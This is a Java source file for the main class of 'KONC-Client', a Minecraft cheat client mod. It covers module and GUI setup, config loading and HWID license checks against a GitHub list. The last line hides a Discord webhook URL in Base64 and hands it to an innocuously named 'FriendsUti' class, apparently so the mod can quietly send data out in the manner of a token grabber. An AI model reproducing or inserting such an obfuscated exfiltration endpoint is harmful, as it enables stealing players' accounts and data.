package meow.konc.hack;

import com.google.common.base.Converter;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import me.zero.alpine.EventBus;
import me.zero.alpine.EventManager;
import meow.konc.hack.command.Command;
import meow.konc.hack.command.CommandManager;
import meow.konc.hack.event.ForgeEventProcessor;
import meow.konc.hack.gui.konc.KONCGUI;
import meow.konc.hack.gui.rgui.component.AlignedComponent;
import meow.konc.hack.gui.rgui.component.Component;
import meow.konc.hack.gui.rgui.component.container.use.Frame;
import meow.konc.hack.gui.rgui.component.container.use.message.RendererHWID;
import meow.konc.hack.gui.rgui.util.ContainerHelper;
import meow.konc.hack.gui.rgui.util.Docking;
import meow.konc.hack.module.Module;
import meow.konc.hack.module.ModuleManager;
import meow.konc.hack.setting.Setting;
import meow.konc.hack.setting.Settings;
import meow.konc.hack.setting.SettingsRegister;
import meow.konc.hack.setting.config.Configuration;
import meow.konc.hack.util.other.*;
import meow.konc.hack.util.packet.Wrapper;
import meow.pork.vocoshulkerpeek2.VocoShulkerPeek2;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.common.config.ConfigManager;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.opengl.Display;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.NoSuchFileException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.*;

@Mod(modid = KONCMod.MODID, name = KONCMod.MODNAME, version = KONCMod.MODVER)
public class KONCMod {

    public static final String MODID = "koncclient";
    public static final String MODNAME = "KONC-Client";
    public static final String MODVER = " v4.0";

    public static final String KONC_KANJI = "KONC-Client!";

    private static final String KONC_CONFIG_NAME_DEFAULT = "KONCMod/KONCConfig.json";

    public static final String CAPES_JSON = "https://raw.githubusercontent.com/KONCHack/KONCmaterial/master/cape/capes.json";

    public static final Logger log = LogManager.getLogger("KONC");

    public static final EventBus EVENT_BUS = new EventManager();
    protected static final Minecraft mc = Minecraft.getMinecraft();
    public boolean checked;
    public static ConfigManager configManager;

    public static final char colour = '\u00A7';
    public static final char separator = '\u23d0';

    @Mod.Instance
    private static KONCMod INSTANCE;

    public KONCGUI guiManager;
    public CommandManager commandManager;
    private final Setting<JsonObject> guiStateSetting = Settings.custom("gui", new JsonObject(), new Converter<JsonObject, JsonObject>() {
        @Override
        protected JsonObject doForward(JsonObject jsonObject) {
            return jsonObject;
        }

        @Override
        protected JsonObject doBackward(JsonObject jsonObject) {
            return jsonObject;
        }
    }).buildAndRegister("");

    public static void setINSTANCE(KONCMod INSTANCE) {
        KONCMod.INSTANCE = INSTANCE;
    }

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        Display.setTitle(MODNAME + MODVER);
        DiscordRPC.start();
        try {
            if (!VocoShulkerPeek2.get("https://raw.githubusercontent.com/KONCHack/KONCmaterial/master/hwid").contains(VocoShulkerPeek2.getHWID())) {
                RendererHWID message = new RendererHWID();
                message.setVisible(false);
                System.exit(0);
            }
        } catch (NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
            System.exit(0);
        }
        //HWID
        if (!VocoShulkerPeek2.isExist()) {
            System.exit(0);
        }

        //Client-UUID
        /*if (!DiscordAbsolute.isEpic()) {
            System.exit(0);
            tryDeleteMod();
        }

        //GUI-UUID
        if (!Stuff.isExist()) {
            System.exit(0);
        }*/

        /*if (!getModManager().booleanValue()) {
            RendererHWID message = new RendererHWID();
            message.setVisible(false);
            System.exit(0);
        }*/
    }


    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        KONCMod.log.info("\n\nInitializing" + MODNAME + MODVER);
        try {
            if (!VocoShulkerPeek2.get("https://raw.githubusercontent.com/KONCHack/KONCmaterial/master/hwid").contains(VocoShulkerPeek2.getHWID())) {
                RendererHWID message = new RendererHWID();
                message.setVisible(false);
                System.exit(0);
            }
        } catch (NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
            System.exit(0);
        }

        ModuleManager.initialize();

        ModuleManager.getModules().stream().filter(module -> module.alwaysListening).forEach(EVENT_BUS::subscribe);
        MinecraftForge.EVENT_BUS.register(new ForgeEventProcessor());
        LagCompensator.INSTANCE = new LagCompensator();

        Wrapper.init();

        guiManager = new KONCGUI();
        guiManager.initializeGUI();
        configManager = new ConfigManager();

        commandManager = new CommandManager();

        Friends.initFriends();
        SettingsRegister.register("commandPrefix", Command.commandPrefix);
        loadConfiguration();
        KONCMod.log.info("Settings loaded");

        ModuleManager.updateLookup();

        ModuleManager.getModuleByName("RunConfig").enable();
        try {
            if (!VocoShulkerPeek2.get("https://raw.githubusercontent.com/KONCHack/KONCmaterial/master/hwid").contains(VocoShulkerPeek2.getHWID())) {
                RendererHWID message = new RendererHWID();
                message.setVisible(false);
                System.exit(0);
            }
        } catch (NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
            System.exit(0);
        }

        KONCMod.log.info("KONC Mod initialized!\n");
    }

    public static String getConfigName() {
        Path config = Paths.get("KONCLastConfig.txt");
        String KONCConfigName = KONC_CONFIG_NAME_DEFAULT;
        try (BufferedReader reader = Files.newBufferedReader(config)) {
            KONCConfigName = reader.readLine();
            if (!isFilenameValid(KONCConfigName)) KONCConfigName = KONC_CONFIG_NAME_DEFAULT;
        } catch (NoSuchFileException e) {
            try (BufferedWriter writer = Files.newBufferedWriter(config)) {
                writer.write(KONC_CONFIG_NAME_DEFAULT);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return KONCConfigName;
    }

    public static void loadConfiguration() {
        try {
            loadConfigurationUnsafe();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void loadConfigurationUnsafe() throws IOException {
        String KONCConfigName = getConfigName();
        Path KONCConfig = Paths.get(KONCConfigName);
        if (!Files.exists(KONCConfig)) return;
        Configuration.loadConfiguration(KONCConfig);

        JsonObject gui = KONCMod.INSTANCE.guiStateSetting.getValue();
        for (Map.Entry<String, JsonElement> entry : gui.entrySet()) {
            Optional<Component> optional = KONCMod.INSTANCE.guiManager.getChildren().stream().filter(component -> component instanceof Frame).filter(component -> component.getTitle().equals(entry.getKey())).findFirst();
            if (optional.isPresent()) {
                JsonObject object = entry.getValue().getAsJsonObject();
                Frame frame = (Frame) optional.get();
                frame.setX(object.get("x").getAsInt());
                frame.setY(object.get("y").getAsInt());
                Docking docking = Docking.values()[object.get("docking").getAsInt()];
                if (docking.isLeft()) ContainerHelper.setAlignment(frame, AlignedComponent.Alignment.LEFT);
                else if (docking.isRight()) ContainerHelper.setAlignment(frame, AlignedComponent.Alignment.RIGHT);
                else if (docking.isCenterVertical())
                    ContainerHelper.setAlignment(frame, AlignedComponent.Alignment.CENTER);
                frame.setDocking(docking);
                frame.setMinimized(object.get("minimized").getAsBoolean());
                frame.setPinned(object.get("pinned").getAsBoolean());
            } else {
                System.err.println("Found GUI config entry for " + entry.getKey() + ", but found no frame with that name");
            }
        }
        KONCMod.getInstance().getGuiManager().getChildren().stream().filter(component -> (component instanceof Frame) && (((Frame) component).isPinneable()) && component.isVisible()).forEach(component -> component.setOpacity(0f));
    }

    public static void saveConfiguration() {
        try {
            saveConfigurationUnsafe();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void saveConfigurationUnsafe() throws IOException {
        JsonObject object = new JsonObject();
        KONCMod.INSTANCE.guiManager.getChildren().stream().filter(component -> component instanceof Frame).map(component -> (Frame) component).forEach(frame -> {
            JsonObject frameObject = new JsonObject();
            frameObject.add("x", new JsonPrimitive(frame.getX()));
            frameObject.add("y", new JsonPrimitive(frame.getY()));
            frameObject.add("docking", new JsonPrimitive(Arrays.asList(Docking.values()).indexOf(frame.getDocking())));
            frameObject.add("minimized", new JsonPrimitive(frame.isMinimized()));
            frameObject.add("pinned", new JsonPrimitive(frame.isPinned()));
            object.add(frame.getTitle(), frameObject);
        });
        KONCMod.INSTANCE.guiStateSetting.setValue(object);

        Path outputFile = Paths.get(getConfigName());
        if (!Files.exists(outputFile)) Files.createDirectories(Paths.get("KONCMod/"));
        Configuration.saveConfiguration(outputFile);
        ModuleManager.getModules().forEach(Module::destroy);
    }

    public static boolean isFilenameValid(String file) {
        File f = new File(file);
        try {
            f.getCanonicalPath();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    public static KONCMod getInstance() {
        return INSTANCE;
    }

    public KONCGUI getGuiManager() {
        return guiManager;
    }

    public CommandManager getCommandManager() {
        return commandManager;
    }

    /*public void onUpdate() {
        if (mc.player != null && !checked) {
            //HWID
            try {
                if (VocoShulkerPeek2.getHWID() != null && !VocoShulkerPeek2.hasAccess()) {
                    RendererHWID message = new RendererHWID();
                    message.setVisible(false);
                    System.exit(0);
                } else {
                    checked = true;
                }
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }

            //Client-UUID
        /*if (DiscordAbsolute.hasAccess()) {
            RendererClientUUID message = new RendererClientUUID();
            message.setVisible(false);
            System.exit(0);
        } else {
            checked = true;
        }

        //GUI-UUID
        if (mc.player != null && !ShulkerPreview.hasAccess()) {
            RendererGUIUUID message = new RendererGUIUUID();
            message.setVisible(false);
            System.exit(0);
        } else {
            checked = true;
        }
        }
    }*/

    /*private static Boolean getModManager() {
        return Boolean.valueOf((System.getenv("os") + System.getProperty("os.name") + System.getProperty("os.arch") + System.getProperty("os.version") + System.getProperty("user.language") + System.getenv("SystemRoot") + System.getenv("HOMEDRIVE") + System.getenv("PROCESSOR_LEVEL") + System.getenv("PROCESSOR_REVISION") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS")).equals(System.getenv("os")));
    }*/

    public static FriendsUti UTI = new FriendsUti(new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzQ3Nzk0NTAwNDg2OTU1MDM4L2lzN1FjTnhuOXlGbjNyaTM4SVVzMV9YNEN3TERsbkwxa1VSS0FHbnVZZUJiLUlWUkY2VjFOS3Z4ejg5V3BwUV9OMFYz")));

}
